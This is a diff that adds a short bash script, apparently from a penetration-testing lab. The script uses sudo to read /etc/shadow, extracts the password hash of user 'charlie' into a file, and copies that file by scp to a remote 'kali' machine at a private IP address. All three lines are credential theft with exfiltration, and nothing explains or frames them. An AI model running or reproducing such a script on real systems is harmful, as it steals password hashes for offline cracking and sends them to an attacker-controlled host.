@@ -1,0 +1,3 @@
+#!/bin/bash
+sudo cat /etc/shadow | egrep "charlie" > hash.txt
+scp hash.txt kali@10.102.201.67:
